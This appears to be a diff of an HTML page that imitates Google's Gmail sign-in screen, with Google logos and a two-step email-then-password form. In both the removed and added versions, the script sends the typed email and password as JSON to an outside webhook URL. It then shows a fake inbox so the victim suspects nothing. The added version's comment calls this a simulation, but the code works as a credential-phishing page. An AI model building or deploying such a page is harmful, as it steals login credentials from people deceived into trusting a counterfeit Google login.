@@ -1,191 +1,224 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>Gmail – Sign in</title>
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500&display=swap" rel="stylesheet" />
-<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
-<style>
-:root{
-  --bg:#f0f2f5;
-  --card:#ffffff;
-  --primary:#1a73e8;
-  --txt:#202124;
-  --sub:#5f6368;
-  --line:#e0e0e0;
-  --hover:#f1f3f4;
-  --shadow:0 2px 10px rgba(0,0,0,.1);
-}
-[data-theme="dark"]{
-  --bg:#121212;
-  --card:rgba(255,255,255,.08);
-  --txt:#e8eaed;
-  --sub:#9aa0a6;
-  --line:rgba(255,255,255,.2);
-  --shadow:rgba(0,0,0,.4);
-}
-*{margin:0;padding:0;box-sizing:border-box;font-family:"Google Sans",sans-serif}
-body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:var(--bg);color:var(--txt);transition:background .3s}
-.toggle{position:absolute;top:12px;right:16px;font-size:24px;cursor:pointer}
-
-/* ---------- ANIMATION CLASSES ---------- */
-.fade-enter{
-  animation:fadeIn .5s ease forwards;
-}
-@keyframes fadeIn{
-  from{transform:translateY(20px);opacity:0}
-  to{transform:translateY(0);opacity:1}
-}
-
-/* ---------- LOGIN ---------- */
-.login-card{
-  width:100%;max-width:400px;padding:50px 40px;border-radius:20px;background:var(--card);box-shadow:var(--shadow);backdrop-filter:blur(20px);
-}
-.login-card img{width:92px;margin:0 auto 20px;display:block}
-.login-card h1{font-size:26px;font-weight:400;text-align:center;margin-bottom:30px}
-.field{position:relative;margin-bottom:28px}
-.field input{width:100%;height:56px;padding:20px 16px 6px;border:1px solid var(--line);border-radius:8px;font-size:16px;background:transparent;transition:border .3s,box-shadow .3s}
-.field label{position:absolute;left:16px;top:18px;color:var(--sub);transition:.2s}
-.field input:focus+label,.field input:not(:placeholder-shown)+label{top:6px;font-size:12px;color:var(--primary)}
-.field input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(26,115,232,.2)}
-.actions{display:flex;justify-content:space-between;align-items:center;margin-top:28px}
-.btn{background:var(--primary);color:#fff;border:none;padding:11px 28px;border-radius:6px;font-size:15px;cursor:pointer;transition:background .3s,transform .15s}
-.btn:hover{background:#1765cc}
-.btn:active{transform:scale(.96)}
-
-/* ---------- INBOX ---------- */
-header{display:flex;align-items:center;height:64px;padding:0 16px;background:var(--card);border-bottom:1px solid var(--line)}
-.hamburger{margin-right:16px}
-.logo{height:40px;margin-right:20px}
-.search{flex:1;max-width:720px;height:48px;border-radius:24px;background:var(--bg);border:1px solid var(--line);display:flex;align-items:center;padding:0 16px}
-.search input{flex:1;border:none;background:none;outline:none;margin:0 8px;color:var(--txt)}
-.profile{width:36px;height:36px;border-radius:50%;cursor:pointer;margin-left:16px}
-.wrapper{display:flex;height:calc(100vh - 64px)}
-.sidebar{width:256px;background:var(--card);border-right:1px solid var(--line);transition:width .3s}
-.sidebar.collapsed{width:72px}
-.compose-btn{margin:8px 16px 20px;height:56px;border-radius:16px;background:var(--primary);color:#fff;font-weight:500;display:flex;align-items:center;justify-content:center;gap:12px}
-.sidebar.collapsed .compose-btn span{display:none}
-.nav-item{height:40px;display:flex;align-items:center;padding:0 16px;border-radius:0 50px 50px 0;margin:0 8px;cursor:pointer;color:var(--sub)}
-.nav-item.active{background:rgba(26,115,232,.12);color:var(--primary)}
-.sidebar.collapsed .nav-item span{display:none}
-.main{flex:1;display:flex;flex-direction:column;overflow:hidden}
-.toolbar{height:48px;padding:0 16px;display:flex;align-items:center;border-bottom:1px solid var(--line)}
-.list{flex:1;overflow-y:auto}
-.row{display:grid;grid-template-columns:32px 1fr auto;align-items:center;padding:12px 16px;border-bottom:1px solid var(--line);cursor:pointer}
-.row:hover{background:var(--hover)}
-.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:999}
-.modal{width:600px;max-width:90vw;background:var(--card);border-radius:12px;animation:pop .25s}
-@keyframes pop{from{transform:scale(.9);opacity:0}}
-.hidden{display:none}
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Gmail – Sign in</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet" />
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #f0f2f5;
+      --card: #fff;
+      --primary: #1a73e8;
+      --txt: #202124;
+      --sub: #5f6368;
+      --line: #e0e0e0;
+    }
+    [data-theme="dark"] {
+      --bg: #121212;
+      --card: #1e1e1e;
+      --txt: #e8eaed;
+      --sub: #9aa0a6;
+      --line: #333;
+    }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: "Google Sans", sans-serif;
+    }
+    body {
+      background: var(--bg);
+      color: var(--txt);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      transition: background 0.3s, color 0.3s;
+    }
+    .toggle {
+      position: absolute;
+      top: 10px;
+      right: 20px;
+      font-size: 24px;
+      cursor: pointer;
+    }
+    .card {
+      background: var(--card);
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 360px;
+    }
+    .card img {
+      display: block;
+      margin: 0 auto 20px;
+      width: 92px;
+    }
+    .card h1 {
+      font-weight: 500;
+      font-size: 22px;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+    .field {
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .field input {
+      width: 100%;
+      padding: 14px 12px;
+      font-size: 16px;
+      border: 1px solid var(--line);
+      border-radius: 6px;
+      background: transparent;
+      color: var(--txt);
+    }
+    .field label {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      color: var(--sub);
+      font-size: 14px;
+      transition: 0.2s;
+      pointer-events: none;
+    }
+    .field input:focus + label,
+    .field input:not(:placeholder-shown) + label {
+      top: -8px;
+      background: var(--card);
+      padding: 0 4px;
+      font-size: 12px;
+      color: var(--primary);
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: var(--primary);
+      border: none;
+      border-radius: 6px;
+      color: #fff;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .inbox {
+      display: none;
+      flex-direction: column;
+      width: 100%;
+      max-width: 600px;
+    }
+    .header {
+      background: var(--card);
+      padding: 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid var(--line);
+    }
+    .list {
+      flex: 1;
+      background: var(--card);
+      border-radius: 12px;
+      margin-top: 20px;
+      overflow: auto;
+    }
+    .email {
+      padding: 16px;
+      border-bottom: 1px solid var(--line);
+    }
+    .email:hover {
+      background: #f1f3f4;
+    }
+    .email h4 {
+      margin-bottom: 4px;
+    }
+    .email p {
+      font-size: 14px;
+      color: var(--sub);
+    }
+  </style>
 </head>
 <body>
 
-<button id="themeToggle" class="toggle">🌙</button>
+<button class="toggle" id="themeToggle">🌙</button>
 
-<!-- ---------- LOGIN ---------- -->
-<section id="loginPage" class="login-card fade-enter">
+<!-- Login Section -->
+<section class="card" id="loginCard">
   <img src="https://accounts.google.com/gsi/style/logos/googlelogo_color_92x36dp.png" alt="Google">
   <h1>Sign in</h1>
   <form id="loginForm">
     <div class="field">
-      <input id="email" type="email" placeholder=" " required>
+      <input type="email" id="email" placeholder=" " required />
       <label>Email or phone</label>
     </div>
-    <div class="field" id="passField" style="display:none">
-      <input id="password" type="password" placeholder=" " required>
+    <div class="field" id="passwordField" style="display: none;">
+      <input type="password" id="password" placeholder=" " required />
       <label>Password</label>
     </div>
-    <div class="actions">
-      <button type="submit" class="btn" id="submitBtn">Next</button>
-    </div>
+    <button class="btn" type="submit" id="submitBtn">Next</button>
   </form>
 </section>
 
-<!-- ---------- INBOX ---------- -->
-<section id="inboxPage" class="hidden">
-  <header>
-    <button id="hamburger" class="material-icons hamburger">menu</button>
-    <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png">
-    <div class="search"><i class="material-icons">search</i><input placeholder="Search mail"><i class="material-icons">tune</i></div>
-    <img class="profile" src="https://i.pravatar.cc/36?u=me">
-  </header>
-  <div class="wrapper">
-    <aside id="sidebar" class="sidebar">
-      <button id="composeBtn" class="compose-btn"><i class="material-icons">edit</i><span>Compose</span></button>
-      <div class="nav-item active"><i class="material-icons">inbox</i><span>Inbox</span></div>
-      <div class="nav-item"><i class="material-icons">star</i><span>Starred</span></div>
-      <div class="nav-item"><i class="material-icons">send</i><span>Sent</span></div>
-    </aside>
-    <main class="main">
-      <div class="toolbar"><input type="checkbox"><i class="material-icons" title="Refresh">refresh</i><i class="material-icons" title="More">more_vert</i></div>
-      <div id="list" class="list"></div>
-    </main>
+<!-- Inbox Section -->
+<section class="inbox" id="inboxPage">
+  <div class="header">
+    <strong>Inbox</strong>
+    <img src="https://i.pravatar.cc/32?u=me" alt="Profile" style="border-radius:50%">
   </div>
+  <div class="list" id="emailList"></div>
 </section>
 
-<div id="modalBg" class="modal-bg">
-  <div class="modal">
-    <header>New Message <i id="closeModal" class="material-icons">close</i></header>
-    <main><input placeholder="To" style="width:100%;border:none;border-bottom:1px solid var(--line);margin-bottom:8px;outline:none"><input placeholder="Subject" style="width:100%;border:none;border-bottom:1px solid var(--line);margin-bottom:8px;outline:none"><textarea placeholder="Your message…" style="width:100%;height:200px;border:none;outline:none;resize:none;background:none"></textarea></main>
-    <footer><button class="btn">Send</button></footer>
-  </div>
-</div>
-
 <script>
-/* ---------- Theme ---------- */
-document.getElementById('themeToggle').onclick = () => {
-  document.body.toggleAttribute('data-theme');
-};
+  const themeToggle = document.getElementById('themeToggle');
+  const loginForm = document.getElementById('loginForm');
+  const emailInput = document.getElementById('email');
+  const passInput = document.getElementById('password');
+  const passwordField = document.getElementById('passwordField');
+  const submitBtn = document.getElementById('submitBtn');
+  const loginCard = document.getElementById('loginCard');
+  const inboxPage = document.getElementById('inboxPage');
+  const emailList = document.getElementById('emailList');
 
-/* ---------- Flow ---------- */
-const loginPage = document.getElementById('loginPage');
-const inboxPage = document.getElementById('inboxPage');
-const passField = document.getElementById('passField');
-document.getElementById('loginForm').addEventListener('submit', async e => {
-  e.preventDefault();
-  const email = document.getElementById('email').value;
-  const password = passField.style.display === 'none' ? '' : document.getElementById('password').value;
+  themeToggle.onclick = () => {
+    document.body.toggleAttribute('data-theme');
+  };
 
-  if (passField.style.display === 'none') {
-    passField.style.display = 'block';
-    document.getElementById('submitBtn').textContent = 'Sign in';
-    return;
-  }
+  loginForm.onsubmit = async e => {
+    e.preventDefault();
+    if (passwordField.style.display === 'none') {
+      passwordField.style.display = 'block';
+      submitBtn.textContent = 'Sign in';
+      return;
+    }
 
-  /* --- webhook POST (line 120) --- */
-  await fetch('https://webhook.site/dbd0ab12-b57d-4b7d-9567-457cb1d8abf9', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ email, password })
-  });
+    // Simulate credential submission
+    await fetch('https://play.svix.com/in/e_Cb6Z8mEkZaEi40pbz4To7voWnZn/', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email: emailInput.value,
+        password: passInput.value
+      })
+    });
 
-  loginPage.classList.add('hidden');
-  inboxPage.classList.remove('hidden');
-  inboxPage.classList.add('fade-enter');
-});
+    loginCard.style.display = 'none';
+    inboxPage.style.display = 'flex';
 
-/* ---------- Inbox ---------- */
-document.getElementById('hamburger').onclick = () => document.getElementById('sidebar').classList.toggle('collapsed');
-document.getElementById('composeBtn').onclick = () => document.getElementById('modalBg').style.display = 'flex';
-document.getElementById('closeModal').onclick = () => document.getElementById('modalBg').style.display = 'none';
-
-const list = document.getElementById('list');
-list.innerHTML = [
-  {from:'Alice',subject:'Project update',snippet:'Latest build attached…',time:'10:42 AM'},
-  {from:'GitHub',subject:'PR #123 opened',snippet:'Review requested',time:'9:21 AM'},
-  {from:'Mom',subject:'Dinner',snippet:'See you at 7?',time:'8:46 AM'}
-].map(m => `
-  <div class="row">
-    <input type="checkbox">
-    <div>
-      <div style="font-weight:500">${m.from}</div>
-      <div style="font-size:13px;color:var(--sub)">${m.subject} – ${m.snippet}</div>
-    </div>
-    <span style="font-size:12px;color:var(--sub)">${m.time}</span>
-  </div>
-`).join('');
+    const emails = [
+      { from: "Alice", subject: "Meeting", message: "Tomorrow at 11 AM." },
+      { from: "GitHub", subject: "New PR", message: "Please review #123" },
+      { from: "Mom", subject: "Dinner", message: "Pizza tonight?" }
+    ];
+    emailList.innerHTML = emails.map(e => `
+      <div class="email">
+        <h4>${e.from} - ${e.subject}</h4>
+        <p>${e.message}</p>
+      </div>
+    `).join('');
+  };
 </script>
 </body>
 </html>
